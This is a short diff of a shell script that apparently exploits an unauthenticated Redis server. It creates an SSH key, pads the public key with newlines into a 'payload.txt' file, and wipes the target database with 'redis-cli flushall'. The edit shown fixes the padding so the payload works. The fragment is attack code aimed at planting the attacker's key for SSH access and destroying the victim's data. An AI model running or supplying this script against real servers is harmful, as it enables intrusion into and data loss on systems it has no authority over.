@@ -20,7 +20,7 @@ if [[ ! -f "$HOME/.ssh/id_rsa.pub" ]]; then
     ssh-keygen -t rsa -b 4096 -C "$USER@$HOSTNAME";
 fi
 
-(echo -e "\n\n\n"; cat "$HOME/.ssh/id_rsa.pub"; echo -n "\n\n\n") > payload.txt
+(echo -e "\n\n\n"; cat "$HOME/.ssh/id_rsa.pub"; echo -e "\n\n\n") > payload.txt
 
 echo -n "Flushing keys from redis database..."
 redis-cli -h "$ip" -p "$port" flushall
